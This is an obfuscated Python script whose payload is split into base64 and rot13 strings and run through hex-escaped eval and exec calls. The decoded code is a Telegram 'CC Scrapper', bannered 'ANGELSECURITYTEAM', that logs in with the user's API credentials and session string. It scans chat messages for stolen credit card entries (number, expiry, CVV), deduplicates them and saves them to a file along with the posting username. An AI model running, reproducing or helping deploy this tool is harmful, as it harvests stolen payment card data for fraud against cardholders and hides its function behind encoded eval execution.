import base64, codecs
magic = 'ZnJvbSBjb2xvcmFtYSBpbXBvcnQgaW5pdApmcm9tIHRlcm1jb2xvciBpbXBvcnQgY29sb3JlZApmcm9tIGRhdGV0aW1lIGltcG9ydCBkYXRlLCBkYXRldGltZSwgdGltZWRlbHRhCmZyb20gdGVsZXRob24uc3luYyBpbXBvcnQgVGVsZWdyYW1DbGllbnQKZnJvbSB0ZWxldGhvbi5zZXNzaW9ucyBpbXBvcnQgU3RyaW5nU2Vzc2lvbgppbXBvcnQgb3MKCgoKIwlvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIHRlbGV0aG9uJykKIwlvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIGNvbG9yYW1hJykKIwlvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIHRlcm1jb2xvcicpCgoJCgppbml0KCkKCgphcnR0ID0gIiIiClwwMzNbMzRtCiAgIF9fX19fX19fX19fXyAgIF9fX19fICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAvIF9fX18vIF9fX18vICAvIF9fXy9fX19fX19fX19fX19fXyBfX19fXyAgX19fXyAgX19fICBfX19fXwogLyAvICAgLyAvICAgICAgIFxfXyBcLyBfX18vIF9fXy8gX18gYC8gX18gXC8gX18gXC8gXyBcLyBfX18vCi8gL19fXy8gL19fXyAgICBfX18vIC8gL19fLyAvICAvIC9fLyAvIC9fLyAvIC9fLyAvICBfXy8gLyAgICAKXF9fX18vXF9fX18vICAgL19fX18vXF9fXy9fLyAgIFxfXyxfLyAuX19fLyAuX19fL1xfX18vXy8gICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC9fLyAgIC9fLyAgICAgICAgICAgICAgICAgClwwMzNbMzdtICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBBTkdFTFNFQ1VSSVRZVEVBTQoKR2V0IFlvdXIgQXBpIGF0IGh0dHBzOi8vbXkudGVsZWdyYW0ub3JnIGFuZCBnbyB0byBBcGlfIGRldmVsb3BtZW50IHRvb2xzLgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKIiIiCgpvcy5zeXN0ZW0oJ2NsZWFyIHx8IGNscycpCnByaW50IChhcnR0KQoKdHJ5OgogICAgQXBpX3NzID0gb3BlbignQXBpXy50eHQnLCdyJykKICAgIEFwaV9zID0gQXBpX3NzLnJlYWRsaW5lcygpCmV4Y2VwdDoKICAgIEFwaV9zcyA9IG9wZW4oJ0FwaV8udHh0JywndycpCiAgICBBcGlfc3MuY2xvc2UoKQogICAgQXBpX3NzID0gb3BlbignQXBpXy50eHQnLCdyJykKICAgIEFwaV9zID0gQXBpX3NzLnJlYWRsaW5lcygpCgppZiBBcGlfcyA9PSBbXToKICAgIHRyeToJCiAgICAgIEFwaV9faWQgPSBpbnQoaW5wdXQoIlwwMzNbMzRtQXBpX19cMDMzWzM0bUlkOiBcMDMzWzM3bSIpKQogICAgICBBcGlfX2hhc2ggPSBpbnB1dCgiXDAzM1szNG1BcGlfXDAzM1szNG1IYXNoOiBcMDMzWzM3bSIpCiAgICBleGNlcHQ6CiAgICAgIGV4aXQoKTsgICAgCiAgICB3aXRoIFRlbGVncmFtQ2xpZW50KFN0cmluZ1Nlc3Npb24oKSwgQXBpX19pZCwgQXBpX19oYXNoKSBhcyBjbGllbnQ6CiAgICAJc3MgPSBjbGllbnQuc2Vzc2lvbi5zYXZlKCkKICAgIEFwaV9faWQgPSBpbnQoc3RyKEFwaV9faWQpLnJlcGxhY2UoJyAnLCcnKSkKICAgIEFwaV9faGFzaCA9IEFwaV9faGFzaC5yZXBsYWNlKCcgJywnJykKICAgIEFwaV9zcyA9IG9wZW4oJ0FwaV8udHh0JywgJ3cnKQogICAgQXBpX3NzLndyaXRlKHN0cihBcGlfX2lkKSkKICAgIEFwaV9zcy53cml0ZSgnXG4nKQogICAgQXBpX3NzLndyaXRlKEFwaV9faGFzaCsnXG4nK3NzKQogICAgQXBpX3NzID0gQXBpX3NzLmNsb3NlKCkKICAgIHRyeToKICAgICAgc2R3ZWQgPSBpbnB1dCgiXDAzM1szNG1QcmVzcyBlbnRlciB0byBcMDMzWzM0bWNvbnRpbnVlXDAzM1szNG0uIikKICAgIGV4Y2VwdDoKICAgICAgZXhpdCgpOwogICAgb3Muc3lzdGVtKCdjbGVhciB8fCBjbHMnKQogICAgZXhpdCgpCmVsaWYgbGVuKEFwaV9zKSA9PSAyOgogICAgQXBpX19pZCA9IGludChBcGlfc1swXSkKICAgIEFwaV9faGFzaCA9IEFwaV9zWzFdCgogICAgcHJpbnQgKCJcMDMzWzM0bUFwaV9cMDMzWzM0bUlkOiAiICsgIlwwMzNbMzdtIiArIHN0cihBcGlfX2lkKSkKICAgIHByaW50ICgiXDAzM1szNG1BcGlfXDAzM1szNG1IYXNoOiAiICsgIlwwMzNbMzdtIiArIEFwaV9faGFzaCkgCiAgICBwcmludCgiXDAzM1szNG1SZW1vdmUgQXBpXy50eHQgaWYgeW91IHdhbnQgdG8gbG9nIGluIHdpdGggYW5vdGhlciB0ZWxlZ3JhbSBhY2NvdW50Jy4iKQogICAgcHJpbnQoJ1xuJykKICAgIHdpdGggVGVsZWdyYW1DbGllbnQoU3RyaW5nU2Vzc2lvbigpLCBBcGlfX2lkLCBBcGlfX2hhc2gpIGFzIGNsaWVudDoKICAgIAlzcyA9IGNsaWVudC5zZXNzaW9uLnNhdmUoKQogICAgQXBpX3NzID0gb3BlbignQXBpXy50eHQnLCAnYScpLndyaXRlKGYnXG57c3N9JykKICAgIHRyeToKICAgICAgc2R3ZWQgPSBpbnB1dCgiXDAzM1szNG1QcmVzcyBlbnRlciB0byBcMDMzWzM0bWNvbnRpbnVlXDAzM1szNG0uIikKICAgIGV4Y2VwdDoKICAgICAgZXhpdCgpOwogICAgb3Muc3lzdGVtKCdjbGVhciB8fCBjbHMnKQogICAgZXhpdCgpCmVsaWYgbGVuKEFwaV9zKSA9PSAzOgogICAgQXBpX19pZCA9IGludChBcGlfc1swXSkKICAgIEFwaV9faGFzaCA9IEFwaV9zWzFdCiAgICBzdHJpbmcgPSBBcGlfc1syXQogICAgcHJpbnQgKCJcMDMzWzM3bWh0dHBzOi8vbXkudGVsZWdyYW0ub3JnL2FwcHMgIikKICAgIHByaW50ICgiXDAzM1szNG1BcGlfXDAzM1szNG1JZDogIiArICJcMDMzWzM3bSIgKyBzdHIoQXBpX19pZCkpCiAgICBwcmludCAoIlwwMzNbMzRtQXBpX1wwMzNbMzRtSGFzaDogIiArICJcMDMzWzM3bSIgKyBBcGlfX2hhc2gpIAogICAgcHJpbnQoIlwwMzNbMzRtUmVtb3ZlIEFwaV8udHh0IGlmIHlvdSB3YW50IHRvIGxvZyBpbiB3aXR'
love = 'bVTSho3EbMKVtqTIfMJqlLJ0tLJAwo3IhqPphVvxXVPNtVUElrGbXVPNtVPNtp2E3MJDtCFOcoaO1qPtvKQNmZ1fmAT1DpzImplOyoaEypvO0olOpZQZmJmZ0oJAioaEcoaIyKQNmZ1fmAT0hVvxXVPNtVTI4L2IjqQbXVPNtVPNtMKucqPtcBjbtVPNto3Zhp3ymqTIgXPqwoTIupvO8sPOwoUZaXDc0pax6VT9mYzAbMTylXPqQD19GL3WupUOyMPpcPzI4L2IjqQbXPJ9mYz1eMTylXPqQD19GL3WupUOyMPpcPtyipl5wnTEcpvtaD0AsH2AlLKOjMJDaXDc1p2IlozSgMFN9VPqOozqyoSAyL3IlnKE5ITIuoFpXoUA0VQ0tJlVjVvjvZFVfVwVvYPVmVvjvAPVfVwHvYPV2VvjvAlVfVwtvYPV5VvjvsPVfVykhVy0XL2AjVQ0toTymqPumMKDbXFxXLlN9VUAyqPtcPaWypTIuqTIxVQ0tp2I0XPxXL250MKVtCFNjPzAfo3WlZFN9VPWpZQZmJmZ0oFVXL2kipaVlVQ0tVyjjZmAoZmEgVtcwoT9lMPN9VQNXo3Zhp3ymqTIgXPqwoTIupvO8sPOwoUZaXDc0pax6VPNtVPNtPvNtpUWcoaDbL29fo3WyMPtaKT5pZQZmJmZ0oHIhqTIlVR51oJWypvOCMvORLKymVR9zVR1yp3AuM2ImVPN9VPpfL29fo3VtCFNaoJSaMJ50LFpcYTIhMPN9VPpaXDbtVTIaMlN9VTyhqPucoaO1qPtcXDcyrTAypUD6PvNtMKucqPtcBjbXqUW5BtbtVUEiMTS5VQ0tMTS0MKEcoJHhoz93XPxXVPOREPN9VUEcoJIxMJk0LFuxLKymCJIaMlxtPvNtMJSloTyypvN9VUEiMTS5VP0tERDXMKuwMKO0BtbtVTI4nKDbXGfXMTyhVQ0tMJSloTyypv5mqUWzqTygMFtvWIxgWJ0gWJDvXDcjpzyhqPtaKT4aXDcjpzyhqPtvVvVXKQNmZ1fmA20XEKuuoKOfMFOQnTShozIfVT9lVRqlo3IjVQbXnUE0pUZ6Yl90Yz1yY25uoJHXDT5uoJHXqTp6Yl9do2yhC2yhqzy0MG1wo2EyK25uoJHXnUE0pUZ6Yl90Yz1yY2cinJ5wnTS0Y2AiMTIsozSgMDbXVvVvXDc0pax6VPNtVPNtPvNtL2uuozyfVQ0tnJ5jqKDbW1jjZmAoZmEgD2uuoz5yoSjjZmAoZmEgY1jjZmAoZmEgE3WiqKOpZQZmJmZ0oGcpZQZmJmZ3oFpcPzI4L2IjqQbXVPOyrTy0XPx7PzAbLJ5coPN9VTAbLJ5coP5lMKOfLJAyXPqNWljaWlxXq2y0nPOHMJkyM3WuoHAfnJIhqPuGqUWcozqGMKAmnJ9hXUA0pzyhMlxfVRSjnI9snJDfVRSjnI9snTSmnPxtLKZtL2kcMJ50BtbtVPNtPvNtVPOvnJ51qFN9VTAbLJ5coNbtVPNtqUW5BtbtVPNtPJAbLJ5coPN9VTAfnJIhqP5aMKEsMJ50nKE5XTAbLJ5coPxXVPNtVNyjpzyhqPuwo2kipzIxXPqpoyjjZmAoZmEgExyZEFOBDH1SVQ0tWlkwo2kipvN9VPqgLJqyoaEuWlxfMJ5xVQ0tWlpcPvNtVPNWo25cL2uuovN9VTyhpUI0XPxXPvNtVPOyrTAypUD6PvNtVPNWL2uuozyfVQ0tLzyhqKHXVPNtVNyiozywnTShVQ0tL2uuozyfPvNtVPOzo3VtoJImp2SaMFOcovOwoTyyoaDhnKEypy9gMKAmLJqypluwnTShnJjcBtbtVPNtVPNtVTyzVTEcovN8CFOgMKAmLJqyYzEuqTHhp3ElMaEcoJHbWlIMYFIgYFIxWlx6PvNtVPNtVPNtPJ1mMlN9VUA0pvugMKAmLJqyYaEyrUDcPvNtVPNtVPNtMJkmMGbtLaWyLJfXVPNtVPNtVPOgp2qfovN9VTkyovugp2pcPvNtVPNtVPNtpaVtCFNjPvNtVPNtVPNtL2ZtCFNvVtbtVPNtVPNtVTkmqTZtCFOoKDbtVPNtVPNtVUqbnJkyVUWlVPR9VT1mM2khBtbtVPNtVPNtVPNtVPOcMvOgp2qopaWqVTyhVTkmqQbXVPNtVPNtVPNtVPNtVPNtVTyzVT1mM1glpy0tCG0toUA0JmOqBtbtVPNtVPNtVPNtVPNtVPNtVPNtVTAwVQ0tL2ZtXlOfp3EoZS0XVPNtVPNtVPNtVPNtVPNtVTIfnJLtoKAaJ3WlKFN9CFOfp3EoZI06PvNtVPNtVPNtVPNtVPNtVPNtVPNtL2ZtCFOwLlNeVTkmqSfkKDbtVPNtVPNtVPNtVPNtVPNtMJkcMvOgp2qopaWqVQ09VTkmqSflKGbXVPNtVPNtVPNtVPNtVPNtVPNtVPOwLlN9VTAwVPftoUA0JmWqPvNtVPNtVPNtVPNtVPNtVPOyoTyzVT1mM1glpy0tCG0toUA0JmAqBtbtVPNtVPNtVPNtVPNtVPNtVPNtVTAwVQ0tL2ZtXlOfp3EoZ10XVPNtVPNtVPNtVPNtVPNtVTIfnJLtoKAaJ3WlKFN9CFOfp3EoAS06PvNtVPNtVPNtVPNtVPNtVPNtVPNtL2ZtCFOwLlNeVTkmqSf0KDbtVPNtVPNtVPNtVPNtVPNtMJkcMvOgp2qopaWqVQ09VTkmqSf1KGbXVPNtVPNtVPNtVPNtVPNtVPNtVPOwLlN9VTAwVPftoUA0JmIqPvNtVPNtVPNtVPNtVPNtVPOyoTyzVT1mM1glpy0tCG0toUA0JmMqBtbtVPNtVPNtVPNtVPNtVPNtVPNtVTAwVQ0tL2ZtXlOfp3EoAy0XVPNtVPNtVPNtVPNtVPNtVTIfnJLtoKAaJ3WlKFN9CFOfp3EoA106PvNtVPNtVPNtVPNtVPNtVPNtVPNtL2ZtCFOwLlNeVTkmqSf3KDbtVPNtVPNtVPNtVPNtVPNtMJkcMvOgp2qopaWqVQ09VTkmqSf4KGbXVPNtVPNtVPNtVPNtVPNtVPNtVPOwLlN9VTAwVPftoUA0JmuqPvNtVPNtVPNtVPNtVPNtVPOyoTyzVT1mM1glpy0tCG0toUA0JmyqBtbtVPNtVPNtVPNtVPNtVPNtVPNtVTAwVQ0tL2ZtXlOfp3EoBI0XVPNtVPNtVPNtVPNtVPNtVTIfnJLtoKAaJ3WlKFN9CFOfp3EoZGOqBtbtVPNtVPNtVPNtVPNtVPNtVPNtVTAwVQ0tL2ZtXlOfp3EoZGOqPvNtVPNtVPNtVPNtVPNtVPOyoTyzVT1mM1glpy0tCG0toUA0JmRkKGbXVPNtVPNtVPNtVPNtVPNtVPNtVPOwLlN9VTAwVPftoUA0JmRkKDbtVPNtVPNtVPNtVPNtVPNtpaVtCFOlpvNeVQRXVPNtVPNtVPNtVPNtMJkmMGbXVPNtVPNtVPNtVPNtVPNtVUWlVQ0tpaVtXlNkPvNtVPNtVPNtozIgMFN9VTLar29hnJAbLJ59K0AQK1AwpzSjpTIxYaE4qPpXVPNtVPNtVPO0pax6VPNtVPNtVPNXVPNtVPNtVPNtVUEyrUEcVQ0to3OyovuhMJ1yYPNaLFpcPvNtVPNtVPNtMKuwMKO0BtbtVPNtVPNtVPNtMKucqPtcBjbtVPNtVPNtVPAxMJMuqJk0PvNtVPNtVP'
god = 'AgciA9IGNjCiAgICAgICAgZiA9IDAKICAgICAgICBkID0gMAogICAgICAgIGRlZiBkZXRlY3RvcihkZXRlY3QpOgogICAgICAgIAlnbG9iYWwgZixkCiAgICAgICAgCWYgPSBpbnQoZGV0ZWN0LmNvdW50KCd8JykpCiAgICAgICAgCWQgPSBpbnQoZi8vMykKICAgICAgICBkZXRlY3RvcihyKQogICAgICAgIGlmIGQgPj0yOgogICAgICAgIAkJCQkJaWYgZiUzPT0wOgogICAgICAgIAkJCQkJCXIgPSByLnJlcGxhY2UoJ1xuJywnICcpCiAgICAgICAgCQkJCQkJbCA9IHIuc3BsaXQoJyAnKQogICAgICAgIAkJCQkJCWZvciBpIGluIHJhbmdlKGQpOgogICAgICAgIAkJCQkJCQl0cnk6CiAgICAgICAgCQkJCQkJCQljLmFkZChsW2ldKQogICAgICAgIAkJCQkJCQlleGNlcHQ6IHBhc3MKICAgICAgICAJCQkJCQlmb3IgaXRlbSBpbiBjOgogICAgICAgIAkJCQkJCQlpZiBsZW4oaXRlbSkgPT0gMjggYW5kICJ8IiBub3QgaW4gc3RyKGl0ZW0pWzA6MTRdIGFuZCAifCIgbm90IGluIHN0cihpdGVtKVsyNjoyOF0gOgogICAgICAgIAkJCQkJCQkJaWYgaXRlbSBub3QgaW4gcmVwZWF0ZWQ6CiAgICAgICAgCQkJCQkJCQkJcmVwZWF0ZWQuYWRkKGl0ZW0pCiAgICAgICAgCQkJCQkJCQkJdGV4dGkud3JpdGUoZid7aXRlbX1cbicpCiAgICAgICAgCQkJCQkJCQkJY250ZXIgKz0xCiAgICAgICAgCQkJCQkJCQkJaWYgY2xvcmQgPT0gMDoKICAgICAgICAJCQkJCQkJCQkJY2xvcmQgPSAxCiAgICAgICAgCQkJCQkJCQkJCXByaW50KCJcMDMzWzM0bSIgKyBpdGVtICsgInwiICsgdXNlcm5hbWUpCiAgICAgICAgCQkJCQkJCQkJCQogICAgICAgIAkJCQkJCQkJCWVsaWYgY2xvcmQgPT0gMToKICAgICAgICAJCQkJCQkJCQkJY2xvcmQgPSAwCiAgICAgICAgCQkJCQkJCQkJCXByaW50KCJcMDMzWzM0bSIgKyBpdGVtICsgInwiICsgdXNlcm5hbWUpCiAgICAgICAgCQkJCQkJCQkJCQogICAgICAgIAkJCQkJCQllbGlmIGxlbihpdGVtKSA9PSAyNiBhbmQgInwiIG5vdCBpbiBzdHIoaXRlbSlbMDoxNF0gYW5kICJ8IiBub3QgaW4gc3RyKGl0ZW0pWzI0OjI2XSA6CiAgICAgICAgCQkJCQkJCQlyZXBlYXRlZC5hZGQoaXRlbSkKICAgICAgICAJCQkJCQkJCW1tID0gaXRlbS5zcGxpdCgnfCcpWzFdCiAgICAgICAgCQkJCQkJCQlhbm9zID0gaXRlbS5zcGxpdCgnfCcpWzJdCiAgICAgICAgCQkJCQkJCQljdnYgPSBpdGVtLnNwbGl0KCd8JylbM10KICAgICAgICAJCQkJCQkJCWl0ZW0gPSBpdGVtLnNwbGl0KCd8JylbMF0KICAgICAgICAJCQkJCQkJCWl0ZW1zID0gJzIwJytzdHIoYW5vcykKICAgICAgICAJCQkJCQkJCWl0ZW0gPSBmJ3tpdGVtfXx7bW19fHtpdGVtc318e2N2dn0nCiAgICAgICAgCQkJCQkJCQlpZiBpdGVtIG5vdCBpbiByZXBlYXRlZDoKICAgICAgICAJCQkJCQkJCQl0ZXh0aS53cml0ZShmJ3tpdGVtfVxuJykKICAgICAgICAJCQkJCQkJCQl0ZXh0aS5jbG9zZQogICAgICAgIAkJCQkJCQkJCWNudGVyICs9MQogICAgICAgIAkJCQkJCQkJCWlmIGNsb3JkID09IDA6CiAgICAgICAgCQkJCQkJCQkJCWNsb3JkID0gMQogICAgICAgIAkJCQkJCQkJCQlwcmludCgiXDAzM1szNG0iICsgaXRlbSArICJ8IiArIHVzZXJuYW1lKQogICAgICAgIAkJCQkJCQkJCiAgICAgICAgCQkJCQkJCQkJZWxpZiBjbG9yZCA9PSAxOgogICAgICAgIAkJCQkJCQkJCQljbG9yZCA9IDAKICAgICAgICAJCQkJCQkJCQkJcHJpbnQoIlwwMzNbMzRtIiArIGl0ZW0gKyAifCIgKyB1c2VybmFtZSkKICAgICAgICAJCQkJCWVsc2U6IHBhc3MKICAgICAgICBpZiAifCIgaW4gY2M6CiAgICAgICAgICAgIGNjID0gY2Muc3BsaXQoJ1xuJykKICAgICAgICAgICAgY2NsbiA9IGxlbihjYykKICAgICAgICAgICAgY2NsID0gMAogICAgICAgICAgICB3aGlsZSBjY2wgIT0gY2NsbjoKICAgICAgICAgICAgICAgIGlmIGxlbihjY1tjY2xdKSA9PSAyOCBhbmQgInwiIG5vdCBpbiBzdHIoY2NbY2NsXSlbMDoxNF0gYW5kICJ8IiBub3QgaW4gc3RyKGNjW2NjbF0pWzI2OjI4XSA6CiAgICAgICAgICAgICAgICAgICAgaWYgY2NbY2NsXSBub3QgaW4gY2NwOgogICAgICAgICAgICAgICAgICAgICAgICByZXBlYXRlZC5hZGQoY2NbY2NsXSkKICAgICAgICAgICAgICAgICAgICAgICAgY2NwLmFwcGVuZChjY1tjY2xdKQogICAgICAgICAgICAgICAgICAgICAgICB0ZXh0aS53cml0ZShjY3BbLTFdKQogICAgICAgICAgICAgICAgICAgICAgICB0ZXh0aS53cml0ZSgnXG4nKQogICAgICAgICAgICAgICAgICAgICAgICB0ZXh0aS5jbG9zZQogICAgICAgICAgICAgICAgICAgICAgICBjbnRlciA9IGNudGVyICsgMQogICAgICAgICAgICAgICAgICAgICAgICBpZiBjbG9yZCA9PSAwOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgY2xvcmQgPSAxCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludCgiXDAzM1szNG0iICsgY2NwWy0xXSArICJ8IiArIHVzZXJuYW1lKQogICAgICAgICAgICAgICAgICAgICAgICBlbGlmIGNsb3JkID09IDE6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjbG9yZCA9IDAKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KCJcMDMzWzM0bSIgKyBjY3BbLTFdICsgInwiICsgdXNlcm5hbWUpCiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYXNzICAgICAgICAKICAgICAgICAgICAgICAgIGVsaWYgbGVuKGNjW2NjbF0pID09IDI2IGFuZCAifCIgbm90IGluIHN0cihjY1tjY2xdKVswOjE0XSBhbmQgInwiIG5vdCBpbiBzdHIoY2NbY2NsXSlbMjQ6MjZdIDoKI'
destiny = 'PNtVPNtVPNtVPNtVPNtVPNtVPOcMvOwL1gwL2kqVT5iqPOcovOwL3N6PvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVUElrGbXVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtPJAwnPN9VTAwJ2AwoS0XVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtPJAwnPN9VTAwnP5mpTkcqPtasPpcPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVNywL24tCFOwL2uoZS0XVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtPJ1goFN9VTAwnSfkKDbtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNWrKy5VQ0tL2AbJmWqPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVNywLaLtCFOwL2uoZ10XVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtPKy5rFN9VPplZPpep3ElXUy5rFxXVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtPJAwnPN9VTLar2Awoa18r21goK18r3y5rK18r2Avqa0aPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVTI4L2IjqQbtL29hqTyhqJHXVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtnJLtL2AbVT5iqPOcovOlMKOyLKEyMQbXVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtPKWypTIuqTIxYzSxMPuwL2tcPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVNywL3NhLKOjMJ5xXTAwnPxXVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtPKEyrUEcYaqlnKEyXTAwpSfgZI0cPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVNy0MKu0nF53pzy0MFtaKT4aXDbtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNWqTI4qTxhL2kip2HXVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtPJAhqTIlVQ0tL250MKVtXlNkPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVNycMvOwoT9lMPN9CFNjBtbtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNWVPNtPJAfo3WxVQ0tZDbtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNWVPNtPKOlnJ50XPWpZQZmJmZ0oFVtXlOwL3OoYGSqVPftVajvVPftqKAypz5uoJHcPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVNyyoTyzVTAfo3WxVQ09VQR6PvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVNxtVPNWL2kipzDtCFNjPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVNxtVPNWpUWcoaDbVyjjZmAoZmEgVvNeVTAwpSfgZI0tXlNvsPVtXlO1p2IlozSgMFxXVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtPJIfp2H6VUOup3ZXVPNtVPNtVPNtVPNtVPNtVTAwoPN9VTAwoPNeVQRXVPNtVPNtVPOyoTyzVTkyovuwLlxtCPNkAGbXVPNtVPNtVPNtVPNtpTSmpjbtVPNtVPNtVPAwL251oDbtVPNtVPNtVTIfnJLtL2AoZQbkAI0hnKAxnJqcqPOuozDtL2AoZS0tCG0tVwDvVT9lVPVmVvOipvNvAFVto3VtVwLvVTShMPOwLl5mpTkcqPtaKT4aXIfkKF5cp2EcM2y0VTShMPOwLl5mpTkcqPtaKT4aXIflKF5cp2EcM2y0BtbtVPNtVPNtVPNtVPO0pax6PvNtVPNtVPNtVPNtVPNtVPOwLlN9VTAwYaAjoTy0XPqpovpcPvNtVPNtVPNtVPNtVPNtVPOhpaEyVQ0tL2AoZy0XVPNtVPNtVPNtVPNtVPNtVT5lqTRtCFOwL1fmKDbtVPNtVPNtVPNtVPNtVPNtnJLtoaW0MIfjKFN9CFNvZvVto3VtoaW0MIfjKFN9CFNvZlVtLJ5xVTkyovuhpaEyXFN9CFNlBtbtVPNtVPNtVPNtVPNtVPNtVPNtVUy5rKxtCFNvZwNvVPftoaW0MDbtVPNtVPNtVPNtVPNtVPNtMJkcMvOhpaEuJmOqVQ09VPVlVvOipvOhpaEuJmOqVQ09VPVmVvOuozDtoTIhXT5lqTRcVQ09VQV6PvNtVPNtVPNtVPNtVPNtVPNtVPNtrKy5rFN9VPVlZPVtXlOhpaEuPvNtVPNtVPNtVPNtVPNtVPOcMvOfMJ4bL2AoZy0cVQ09VQVtLJ5xVUA0pvuwL1flKFyoZS0tVG0tVwVvBtbtVPNtVPNtVPNtVPNtVPNtVPNtVT1gVQ0tL2AoZy0XVPNtVPNtVPNtVPNtVPNtVTIfnJLtoTIhXTAwJmAqXFN9CFNlVTShMPOmqUVbL2AoZ10cJmOqVPR9VPVlVwbXVPNtVPNtVPNtVPNtVPNtVPNtVPOgoFN9VTAwJmAqPvNtVPNtVPNtVPNtVPNtVPOwL2IlVQ0tL2AoZS0tXlNvsPVtXlOgoFNeVPW8VvNeVUy5rKxtXlNvsPVtXlOwL1fkKDbtVPNtVPNtVPNtVPNtVPNtnJLtL2AypvOho3DtnJ4tL2AjVTShMPOfMJ4bL2AypvxtCG0tZwt6PvNtVPNtVPNtVPNtVPNtVPNtVPNtL2AjYzSjpTIhMPuwL2IlXDbtVPNtVPNtVPNtVPNtVPNtVPNtVTyzVTAwMKVtoz90VTyhVUWypTIuqTIxBtbtVPNtVPNtVPNtVPNtVPNtVPNtVNylMKOyLKEyMP5uMTDbL2AypvxXVPNtVPNtVPNtVPNtVPNtVPNtVPNWnUIcovN9VTkcp3DbpzIjMJS0MJDcPvNtVPNtVPNtVPNtVPNtVPNtVPNtPKEyrUEcYaqlnKEyXTu1nJ5oYGSqXDbtVPNtVPNtVPNtVPNtVPNtVPNtVNy0MKu0nF53pzy0MFtaKT4aXDbtVPNtVPNtVPNtVPNtVPNtVPNtVNy0MKu0nF5woT9mMDbtVPNtVPNtVPNtVPNtVPNtVPNtVNywoaEypvN9VTAhqTIlVPftZDbtVPNtVPNtVPNtVPNtVPNtVPNtVNycMvOwoT9lMPN9CFNjBtbtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNWL2kipzDtCFNkPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVNyjpzyhqPtvKQNmZ1fmAT0vVPftnUIcoyfgZI0tXlNvsPVtXlO1p2IlozSgMFxXVPNtVPNtVPNtVPNtVPNtVPNtVPNWMJkcMvOwoT9lMPN9CFNkBtbtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNWL2kipzDtCFNjPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVNyjpzyhqPtvKQNmZ1fmAT0vVPftnUIcoyfgZI0tXlNvsPVtXlO1p2IlozSgMFxXVPNtVPNtVPNtVPNtVPNtVPNtVPNWMJkmMGbXVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtPKOup3ZXVPNtVPNtVPNtVPNtMKuwMKO0BtbtVPNtVPNtVPNtVPNtVPNtpTSmpjbtVPNtVPNtVPNtVPNtVPNtPvNtVPNtVNbtVPNtVPNtVTIfp2H6PvNtVPNtVPNtVPNtVUOup3ZXVPNtVPNtVPNtVPNtPaOlnJ50XPqpZQZmJmZ3oIAuqzHtEzyfMFN6VRAQK1AwpzSjpTIxYlpeozIgMFxX'
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
